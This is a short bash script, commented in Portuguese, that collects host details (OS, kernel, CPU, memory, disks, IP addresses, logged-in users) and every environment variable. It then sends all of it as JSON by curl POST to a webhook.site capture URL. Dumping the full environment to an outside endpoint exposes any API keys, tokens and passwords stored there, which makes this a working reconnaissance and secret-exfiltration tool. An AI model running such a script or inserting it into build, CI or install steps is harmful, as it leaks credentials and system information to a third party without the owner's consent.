#!/bin/bash

# Defina o endpoint para onde enviar os dados
ENDPOINT="https://webhook.site/80ecab9f-f9b1-406e-aa40-d3ed71a6591c"

# Captura informações do sistema
HOSTNAME=$(hostname)
OS=$(uname -o)
KERNEL=$(uname -r)
UPTIME=$(uptime -p)

# Informações sobre CPU
CPU_MODEL=$(lscpu | grep "Model name" | awk -F: '{print $2}' | sed 's/^ *//')
CPU_CORES=$(nproc)

# Informações sobre memória
MEM_TOTAL=$(free -m | awk '/Mem:/ {print $2}')
MEM_USED=$(free -m | awk '/Mem:/ {print $3}')
SWAP_TOTAL=$(free -m | awk '/Swap:/ {print $2}')
SWAP_USED=$(free -m | awk '/Swap:/ {print $3}')

# Informações sobre armazenamento
DISK_USAGE=$(df -h --output=source,size,used,avail,pcent | tail -n +2)
DISK_INFO=$(lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT | tail -n +2)

# Informações sobre rede
IP_ADDRESSES=$(ip -4 addr show | grep "inet" | awk '{print $2}')

# Captura todas as variáveis de ambiente
ENV_VARS=$(env | sed ':a;N;$!ba;s/\n/\\n/g')

# Captura usuários ativos e usuário atual
CURRENT_USER=$(whoami)
ACTIVE_USERS=$(who | awk '{print $1}' | sort | uniq | tr '\n' ',' | sed 's/,$//')

# Monta o JSON
JSON_DATA=$(cat <<EOF
{
  "hostname": "$HOSTNAME",
  "os": "$OS",
  "kernel": "$KERNEL",
  "uptime": "$UPTIME",
  "cpu": {
    "model": "$CPU_MODEL",
    "cores": "$CPU_CORES"
  },
  "memory": {
    "total_mb": "$MEM_TOTAL",
    "used_mb": "$MEM_USED",
    "swap_total_mb": "$SWAP_TOTAL",
    "swap_used_mb": "$SWAP_USED"
  },
  "storage": {
    "disk_usage": "$(echo "$DISK_USAGE" | sed ':a;N;$!ba;s/\n/\\n/g')",
    "disk_info": "$(echo "$DISK_INFO" | sed ':a;N;$!ba;s/\n/\\n/g')"
  },
  "network": {
    "ip_addresses": "$(echo "$IP_ADDRESSES" | sed ':a;N;$!ba;s/\n/\\n/g')"
  },
  "environment_variables": "$(echo "$ENV_VARS")",
  "users": {
    "current_user": "$CURRENT_USER",
    "active_users": "$ACTIVE_USERS"
  }
}
EOF
)

# Envia os dados via HTTP POST
curl -X POST "$ENDPOINT" \
     -H "Content-Type: application/json" \
     -d "$JSON_DATA"

echo "Relatório enviado para $ENDPOINT"
